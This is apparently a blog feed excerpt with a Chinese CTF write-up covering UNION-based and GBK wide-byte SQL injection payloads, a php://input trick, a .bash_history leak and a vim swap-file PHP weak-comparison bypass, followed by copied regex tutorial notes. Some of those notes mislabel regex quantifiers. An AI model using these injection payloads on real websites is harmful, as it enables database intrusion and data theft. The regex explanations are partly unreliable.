&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;E_Name&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Zhang, Hua&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Wang, Wei&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Carter, Thomas&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Yang, Ming&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Adams, John&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Bush, George&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Gates, Bill&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;union查询必须和第一句查询语句查询列数相同，不然会出现错误；&lt;/li&gt;
&lt;li&gt;union查询的时候，返回的结果的列名个第一条查询语句是相同的&lt;/li&gt;
&lt;li&gt;union第一条查询失败后会返回第二条的结果，但是列名还是第一条查询的列名&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此题正是用到了第三条知识点：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
Secure Web Login II
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
 
&amp;lt;?php
if($_POST[user] &amp;amp;&amp;amp; $_POST[pass]) {
   mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $user = $_POST[user];
  $pass = md5($_POST[pass]);
  $query = @mysql_fetch_array(mysql_query(&amp;quot;select pw from ctf where user=&#39;$user&#39;&amp;quot;));
  if (($query[pw]) &amp;amp;&amp;amp; (!strcasecmp($pass, $query[pw]))) {
      echo &amp;quot;&amp;lt;p&amp;gt;Logged in! Key: ntcf{**************} &amp;lt;/p&amp;gt;&amp;quot;;
  }
  else {
    echo(&amp;quot;&amp;lt;p&amp;gt;Log in failure!&amp;lt;/p&amp;gt;&amp;quot;);
  }
}
?&amp;gt;
 
 
&amp;lt;form method=post action=index.php&amp;gt;
&amp;lt;input type=text name=user value=&amp;quot;Username&amp;quot;&amp;gt;
&amp;lt;input type=password name=pass value=&amp;quot;Password&amp;quot;&amp;gt;
&amp;lt;input type=submit&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;a href=&amp;quot;index.phps&amp;quot;&amp;gt;Source&amp;lt;/a&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;意思是查询到的pw和输入的pw（经过md5加密后）相同，则输出flag；&lt;/p&gt;
&lt;p&gt;playload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;user=&#39; union select md5(1)#
pw=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查询结果其实是：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;pw&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;md5（1）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;于是输入pw=1即可满足；&lt;/p&gt;
&lt;p&gt;nctf{union_select_is_wtf}&lt;/p&gt;
&lt;h3 id=&#34;gbk-injectionhttpchinaloversinaappcomsql-gbkindexphpid1&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GBK Injection&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;知识点：&lt;/p&gt;
&lt;p&gt;宽字节注入：&lt;/p&gt;
&lt;p&gt;当传入的单引号会被反斜杠转义的时候，一般情况下是不存在sql注入漏洞的，但是有一个特例，那就是数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式是在地址后面先加一个%df，再加单引号，因为&lt;strong&gt;反斜杠的编码为%5c&lt;/strong&gt;，然而再GBK编码中，&lt;strong&gt;%df%5c是繁体字“謰”&lt;/strong&gt;，所以这个时候，单引号就不会被反斜杠转义，造成注入。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164611.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;输入%df之后：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164617.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;此时已经造成了注入；&lt;/p&gt;
&lt;p&gt;先使用order by语句查询出表中有多少列：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;id=1%df%27+order+by+2%23   //不报错
id=1%df%27+order+by+3%23   //报错，判断列数为2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或者使用union查询：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;id=1%df%27+union+select+null,null%23          //不报错
id=1%df%27+union+select+null,null,null%23     //报错，判断列数为2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;随后可将null换成查询语句，想要union查询到我们自己输入的语句，需要把1换成-1，&lt;/p&gt;
&lt;p&gt;因为单引号被过滤，所以我们可以使用嵌套查询：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-1%df%27%20union+select+null,(select+table_name+from+information_schema.tables+where+table_schema=(select+database())limit+0,1)%23
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这句可以查到表名，但是只能插一个，想要查到其他的需要更改limit的值&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-1%df%27%20union+select+null,(select+column_name+from+information_schema.columns+where+table_schema=(select+database())+and+table_name=(select+table_name+from+information_schema.tables+where+table_schema=(select+database())+limit+0,1)+limit+1,2)%23
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这句可以查到字段名；&lt;/p&gt;
&lt;p&gt;但是这道题我们不推荐这个嵌套查询的方法。&lt;/p&gt;
&lt;p&gt;有一个系统自带的函数：group_concat()（一般是CTF中常用的）:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;id=-1%df%27%20union+select+null,group_concat(table_name)+from+information_schema.tables+where+table_schema=database()%23
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://wh1sper.com/wp-content/uploads/2020/02/GBK_injection-7.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;直接查到了所有表名；&lt;/p&gt;
&lt;p&gt;虽然单引号被过滤了，我们可以使用16进制绕过的方法：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;id=-1%df%27%20union+select+null,group_concat(column_name)+from+information_schema.columns+where+table_name=0x6e657773%23
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://wh1sper.com/wp-content/uploads/2020/02/GBK_injection-8.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;直接查到了news（0x6e657773）表中所有字段名；&lt;/p&gt;
&lt;p&gt;在这之后，可以把union中的null替换为查询语句&lt;/p&gt;
&lt;p&gt;select 字段名 from 表名&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;id=-1%df%27%20union%20select%20null,flag%20from%20ctf4%23
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当然其他的表存在假的flag，这个才是真的；&lt;/p&gt;
&lt;p&gt;flag{this_is_sqli_flag}&lt;/p&gt;
&lt;h3 id=&#34;file_get_contentshttpchinaloversinaappcomweb23&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;http://chinalover.sinaapp.com/web23/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;file_get_contents&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;知识点：php://input访问POST请求的原始数据的只读流&lt;/p&gt;
&lt;p&gt;访问题目，查看源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!--$file = $_GET[&#39;file&#39;];
if(@file_get_contents($file) == &amp;quot;meizijiu&amp;quot;){
    echo $nctf;
}--&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里使用PHP伪协议php://input访问未处理过的POST数据：&lt;/p&gt;
&lt;p&gt;burp suite发包：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /web23/?file=php://input HTTP/1.1
Host: chinalover.sinaapp.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 8

meizijiu
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以直接得到flag：&lt;/p&gt;
&lt;p&gt;nctf{0b021b88527c69e5}&lt;/p&gt;
&lt;h3 id=&#34;综合题httpteamxlcsinaappcomweb3b0b0ad119f425408fc3d45253137d33dindexphp&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;综合题&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：JSFuck、命令记录文件.bash_history&lt;/p&gt;
&lt;p&gt;打开题目是一串的JSFuck：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164630.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;直接复制到F12里面的控制台运行，得到：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1bc29b36f623ba82aaf6724fd3b16718.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;直接访问这个页面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164641.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;这里是一个脑洞，&lt;/p&gt;
&lt;p&gt;其实他说TIP在他脑袋里，其实就是“head”，暗示了&lt;strong&gt;HTTP头&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164649.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tip: history of bash
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;linux的-用户目录下三个bash文件的作用httpsblogcsdnnetu011479200articledetails86501366&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/u011479200/article/details/86501366&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Linux的 用户目录下三个bash文件的作用:&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;(.bash_history,.bash_logout,.bash_profile,.bashrc)&lt;/p&gt;
&lt;p&gt;这里就只说.bash_history:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Bash shell在“~/.bash_history”（“~/”表示用户目录）文件中保存了500条使用过的命令，这样能使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;于是我们访问.bash_history这个文件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164701.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;我们继续访问flagbak.zip，就能直接下载这个文件，解压打开就是flag：&lt;/p&gt;
&lt;p&gt;nctf{bash_history_means_what}&lt;/p&gt;
&lt;h3 id=&#34;heading&#34;&gt;&lt;/h3&gt;
&lt;h3 id=&#34;密码重置2httpnctfnuptzjcnweb14&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;http://nctf.nuptzj.cn/web14/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;密码重置2&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：Linux下vi编辑器退出后留下的备份文件、弱类型比较&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164708.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;查看源码中可以找到admin的邮箱，随意舔一个token后提交得到一个提示fail的页面；&lt;/p&gt;
&lt;p&gt;根据题干的提示，这个是用Linux下vi编辑器编辑的；&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。&lt;/li&gt;
&lt;li&gt;需要注意的是如果你并没有对文件进行修改，而&lt;strong&gt;只是读取文件，是不会产生.swp文件的&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。而原来的文件中并不会有这次的修改，文件内容还是和打开时一样。&lt;/li&gt;
&lt;li&gt;例如，第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考：https://blog.csdn.net/qq_35405259/article/details/86476663&lt;/p&gt;
&lt;p&gt;于是我们可以去访问&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://nctf.nuptzj.cn/web14/.submit.php.swp   //submit前面一定有一个&amp;quot;.&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以得到submit页面的源码，其中关键部分是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if(!empty($token)&amp;amp;&amp;amp;!empty($emailAddress)){
	if(strlen($token)!=10) die(&#39;fail&#39;);
	if($token!=&#39;0&#39;) die(&#39;fail&#39;);
	$sql = &amp;quot;SELECT count(*) as num from `user` where token=&#39;$token&#39; AND email=&#39;$emailAddress&#39;&amp;quot;;
	$r = mysql_query($sql) or die(&#39;db error&#39;);
	$r = mysql_fetch_assoc($r);
	$r = $r[&#39;num&#39;];
	if($r&amp;gt;0){
		echo $flag;
	}else{
		echo &amp;quot;失败了呀&amp;quot;;
	}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;第2、3行弱类型比较，我们只需要输入token=0000000000（10个）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164715.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;nctf{thanks_to_cumt_bxs}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>正则表达式学习笔记</title>
        <link>https://anthem-whisper.github.io/p/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
        <pubDate>Mon, 27 Jan 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
        <description>&lt;p&gt;转自：https://www.cnblogs.com/zery/p/3438845.html&lt;/p&gt;
&lt;p&gt;教程：https://www.runoob.com/regexp/regexp-tutorial.html&lt;/p&gt;
&lt;h3 id=&#34;一-前言&#34;&gt;一 、前言&lt;/h3&gt;
&lt;p&gt;　　对于正则表达式，相信很多人都知道，但是很多人的第一感觉就是难学，因为看第一眼时，觉得完全没有规律可寻，而且全是一堆各种各样的特殊符号，完全不知所云。&lt;/p&gt;
&lt;p&gt;其实只是对正则不了解而以，了解了你就会发现，原来就这样啊正则所用的相关字符其实不多，也不难记，更不难懂，唯一难的就是组合起来之后，可读性比较差，而且不容易理解，本文旨在让大家对正则有一个基本的了解，能看得懂简单的正则表达式，写得出简单的正则表达式，用以满足日常开发中的需求即可。&lt;/p&gt;
&lt;p&gt;0\d{2}-\d{8}|0\d{3}-\d{7} 先来一段正则，如果你对正则不了解，是不是完全不知道这一串字符是什么意思？这不要紧文章会详细解释每个字符的含义的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.1 什么是正则表达式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;正则表达式是一种特殊的字符串模式，用于匹配一组字符串，就好比用模具做产品，而正则就是这个模具，定义一种规则去匹配符合规则的字符。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.2 常用的正则匹配工具&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在线匹配工具：&lt;/p&gt;
&lt;p&gt;　 1 &lt;a href=&#34;http://www.regexpal.com/&#34;&gt;http://www.regexpal.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2 &lt;a href=&#34;http://rubular.com/&#34;&gt;http://rubular.com/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;二-正则字符简单介绍&#34;&gt;二 、正则字符简单介绍&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;2.1 元字符介绍&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;^&amp;quot;&lt;/strong&gt; ：^会匹配行或者字符串的起始位置，有时还会匹配整个文档的起始位置。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;$&amp;quot;&lt;/strong&gt; ：$会匹配行或字符串的结尾&lt;/p&gt;
&lt;p&gt;如图&lt;/p&gt;
&lt;p&gt;​     而且被匹配的字符必须是以This开头有空格也不行，必须以Regex结尾，也不能有空格与其它字符&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;data:image/svg&amp;#43;xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc&amp;#43;&#34; alt=&#34;img&#34;  /&gt;&lt;img src=&#34;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8&amp;#43;PB/AAffA0nNPuCLAAAAAElFTkSuQmCC&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;\b&amp;quot;&lt;/strong&gt; :不会消耗任何字符只匹配一个位置，常用于匹配单词边界 如 我想从字符串中&amp;quot;This is Regex&amp;quot;匹配单独的单词 &amp;ldquo;is&amp;rdquo; 正则就要写成 &amp;ldquo;\bis\b&amp;rdquo;&lt;/p&gt;
&lt;p&gt;　　  \b 不会匹配is 两边的字符，但它会识别is 两边是否为单词的边界&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;\d&amp;quot;&lt;/strong&gt;: 匹配数字，&lt;/p&gt;
&lt;p&gt;　　  例如要匹配一个固定格式的电话号码以0开头前4位后7位，如0737-5686123  正则:^0\d\d\d-\d\d\d\d\d\d\d$ 这里只是为了介绍&amp;quot;\d&amp;quot;字符，实际上有更好的写法会在   下面介绍。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;\w&amp;quot;&lt;/strong&gt;：匹配字母，数字，下划线.&lt;/p&gt;
&lt;p&gt;　　  例如我要匹配&amp;quot;a2345BCD__TTz&amp;quot; 正则：&amp;quot;\w+&amp;quot;  这里的&amp;quot;+&amp;ldquo;字符为一个量词指重复的次数，稍后会详细介绍。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;\s&amp;rdquo;&lt;/strong&gt;：匹配空格&lt;/p&gt;
&lt;p&gt;　　  例如字符 &amp;ldquo;a b c&amp;rdquo; 正则：&amp;quot;\w\s\w\s\w&amp;quot;  一个字符后跟一个空格，如有字符间有多个空格直接把&amp;quot;\s&amp;quot; 写成 &amp;ldquo;\s+&amp;rdquo; 让空格重复&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;.&amp;quot;&lt;/strong&gt;：匹配除了换行符以外的任何字符&lt;/p&gt;
&lt;p&gt;　　  这个算是&amp;quot;\w&amp;quot;的加强版了&amp;quot;\w&amp;quot;不能匹配 空格 如果把字符串加上空格用&amp;quot;\w&amp;quot;就受限了，看下用 &amp;ldquo;.&amp;ldquo;是如何匹配字符&amp;quot;a23 4 5 B C D__TTz&amp;rdquo;  正则：&amp;rdquo;.+&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;[abc]&amp;quot;&lt;/strong&gt;: 字符组  匹配包含括号内元素的字符&lt;/p&gt;
&lt;p&gt;​    这个比较简单了只匹配括号内存在的字符，还可以写成[a-z]匹配a至z的所以字母就等于可以用来控制只能输入英文了，&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.2 几种反义&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　写法很简单改成大写就行了，意思与原来的相反，这里就不举例子了&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;****\W&amp;quot;&lt;/strong&gt;  匹配任意不是字母，数字，下划线 的字符&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;\S&amp;quot;&lt;/strong&gt;  匹配任意不是空白符的字符&lt;/p&gt;
&lt;p&gt;　&lt;strong&gt;&amp;quot;\D&amp;quot;&lt;/strong&gt; 匹配任意非数字的字符&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;\B&amp;quot;&lt;/strong&gt; 匹配不是单词开头或结束的位置&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;[^abc]&amp;quot;&lt;/strong&gt; 匹配除了abc以外的任意字符&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.3  量词&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　先解释关于量词所涉及到的重要的三个概念&lt;/p&gt;
&lt;p&gt;贪婪(贪心) 如&amp;quot;*&amp;ldquo;字符 贪婪量词会首先匹配整个字符串，尝试匹配时，它会选定尽可能多的内容，如果 失败则回退一个字符，然后再次尝试回退的过程就叫做回溯，它会每次回退一个字符，直到找到匹配的内容或者没有字符可以回退。相比下面两种贪婪量词对资源的消耗是最大的，&lt;/p&gt;
&lt;p&gt;懒惰(勉强) 如 &amp;ldquo;?&amp;rdquo;  懒惰量词使用另一种方式匹配，它从目标的起始位置开始尝试匹配，每次检查一个字符，并寻找它要匹配的内容，如此循环直到字符结尾处。&lt;/p&gt;
&lt;p&gt;占有  如&amp;rdquo;+&amp;quot; 占有量词会覆盖事个目标字符串，然后尝试寻找匹配内容 ，但它只尝试一次，不会回溯，就好比先抓一把石头，然后从石头中挑出黄金&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;*&amp;quot;(贪婪)&lt;/strong&gt;  重复零次或更多&lt;/p&gt;
&lt;p&gt;　　　  例如&amp;quot;aaaaaaaa&amp;quot; 匹配字符串中所有的a  正则： &amp;ldquo;a*&amp;rdquo;  会出到所有的字符&amp;quot;a&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;+&amp;quot;(懒惰)&lt;/strong&gt;  重复一次或更多次&lt;/p&gt;
&lt;p&gt;　　   例如&amp;quot;aaaaaaaa&amp;quot; 匹配字符串中所有的a  正则： &amp;ldquo;a+&amp;rdquo;  会取到字符中所有的a字符，  &amp;ldquo;a+&amp;ldquo;与&amp;quot;a*&amp;ldquo;不同在于&amp;rdquo;+&amp;ldquo;至少是一次而&amp;rdquo;*&amp;rdquo; 可以是0次，&lt;/p&gt;
&lt;p&gt;　　   稍后会与&amp;rdquo;?&amp;ldquo;字符结合来体现这种区别&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;rdquo;?&amp;quot;(占有)&lt;/strong&gt;  重复零次或一次&lt;/p&gt;
&lt;p&gt;　　   例如&amp;quot;aaaaaaaa&amp;quot; 匹配字符串中的a 正则 ： &amp;ldquo;a?&amp;rdquo; 只会匹配一次，也就是结果只是单个字符a&lt;/p&gt;
&lt;p&gt;　  &lt;strong&gt;&amp;quot;{n}&amp;quot;&lt;/strong&gt; 重复n次&lt;/p&gt;
&lt;p&gt;　　   例如从&amp;quot;aaaaaaaa&amp;quot; 匹配字符串的a 并重复3次 正则：  &amp;ldquo;a{3}&amp;rdquo;  结果就是取到3个a字符  &amp;ldquo;aaa&amp;rdquo;;&lt;/p&gt;
&lt;p&gt;　  &lt;strong&gt;&amp;quot;{n,m}&amp;quot;&lt;/strong&gt; 重复n到m次&lt;/p&gt;
&lt;p&gt;　　   例如正则 &amp;ldquo;a{3,4}&amp;rdquo; 将a重复匹配3次或者4次 所以供匹配的字符可以是三个&amp;quot;aaa&amp;quot;也可以是四个&amp;quot;aaaa&amp;quot; 正则都可以匹配到&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;quot;{n,}&amp;quot;&lt;/strong&gt; 重复n次或更多次&lt;/p&gt;
&lt;p&gt;　   与{n,m}不同之处就在于匹配的次数将没有上限，但至少要重复n次 如 正则&amp;quot;a{3,}&amp;quot; a至少要重复3次&lt;/p&gt;
&lt;p&gt;把量词了解了之后之前匹配电话号码的正则现在就可以改得简单点了^0\d\d\d-\d\d\d\d\d\d\d$ 可以改为&amp;quot;^0\d+-\d{7}$&amp;quot;。&lt;/p&gt;
&lt;p&gt;这样写还不够完美如果因为前面的区号没有做限定，以至于可以输入很多们，而通常只能是3位或者4位，&lt;/p&gt;
&lt;p&gt;现在再改一下 &amp;ldquo;^0\d{2,3}-\d{7}&amp;ldquo;如此一来区号部分就可以匹配3位或者4位的了&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.4 懒惰限定符&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;&amp;quot;*?&amp;quot;&lt;/strong&gt;  重复任意次，但尽可能少重复&lt;/p&gt;
&lt;p&gt;　　   如 &amp;ldquo;acbacb&amp;rdquo;  正则  &amp;ldquo;a.*?b&amp;rdquo; 只会取到第一个&amp;quot;acb&amp;rdquo; 原本可以全部取到但加了限定符后，只会匹配尽可能少的字符 ，而&amp;quot;acbacb&amp;quot;最少字符的结果就是&amp;quot;acb&amp;rdquo;&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;&amp;quot;+?&amp;quot;&lt;/strong&gt; 重复1次或更多次，但尽可能少重复&lt;/p&gt;
&lt;p&gt;　　  与上面一样，只是至少要重复1次&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;&amp;quot;??&amp;quot;&lt;/strong&gt; 重复0次或1次，但尽可能少重复&lt;/p&gt;
&lt;p&gt;　　   如 &amp;ldquo;aaacb&amp;rdquo; 正则 &amp;ldquo;a.??b&amp;rdquo; 只会取到最后的三个字符&amp;quot;acb&amp;quot;&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;&amp;quot;{n,m}?&amp;quot;&lt;/strong&gt; 重复n到m次，但尽可能少重复&lt;/p&gt;
&lt;p&gt;​     如 &amp;ldquo;aaaaaaaa&amp;rdquo;  正则 &amp;ldquo;a{0,m}&amp;rdquo; 因为最少是0次所以取到结果为空&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;&amp;quot;{n,}?&amp;quot;&lt;/strong&gt;   重复n次以上，但尽可能少重复&lt;/p&gt;
&lt;p&gt;​     如 &amp;ldquo;aaaaaaa&amp;rdquo;  正则 &amp;ldquo;a{1,}&amp;rdquo; 最少是1次所以取到结果为 &amp;ldquo;a&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;修饰符：&lt;/strong&gt;
i ：如果在修饰符中加上&amp;quot;i&amp;quot;，则正则将会取消大小写敏感性，即&amp;quot;a&amp;quot;和&amp;quot;A&amp;quot; 是一样的。
m：默认的正则开始&amp;quot;^&amp;ldquo;和结束&amp;rdquo;$&amp;ldquo;只是对于正则字符串如果在修饰符中加上&amp;quot;m&amp;rdquo;，那么开始和结束将会指字符串的每一行：每一行的开头就是&amp;quot;^&amp;quot;，结尾就是&amp;quot;$&amp;quot;。
s：如果在修饰符中加入&amp;quot;s&amp;quot;，那么默认的&amp;quot;.&amp;ldquo;代表除了换行符以外的任何字符将会变成任意字符，也就是包括换行符！
x：如果加上该修饰符，表达式中的空白字符将会被忽略，除非它已经被转义。
e：本修饰符仅仅对于replacement有用，代表在replacement中作为PHP代码。
A：如果使用这个修饰符，那么表达式必须是匹配的字符串中的开头部分。比如说&amp;rdquo;/a/A&amp;quot;匹配&amp;quot;abcd&amp;quot;。
E：与&amp;quot;m&amp;quot;相反，如果使用这个修饰符，那么&amp;quot;$&amp;ldquo;将匹配绝对字符串的结尾，而不是换行符前面，默认就打开了这个模式。
U：和问号的作用差不多，用于设置&amp;quot;贪婪模式&amp;rdquo;。&lt;/p&gt;
